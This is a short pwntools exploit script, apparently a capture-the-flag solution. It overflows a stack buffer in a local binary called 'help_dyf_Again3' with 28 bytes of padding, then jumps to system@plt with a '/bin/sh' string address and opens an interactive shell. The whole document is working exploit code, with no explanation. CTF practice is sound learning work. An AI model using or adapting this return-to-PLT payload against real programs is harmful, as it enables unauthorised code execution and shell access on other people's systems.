from pwn import *

sh = process('./help_dyf_Again3')

system_plt = 0x08049050

sh_addr = 0x0804a008

payload='a' *28 + p32(system_plt) + p32(1) + p32(sh_addr)

sh.sendline(payload)

sh.interactive()

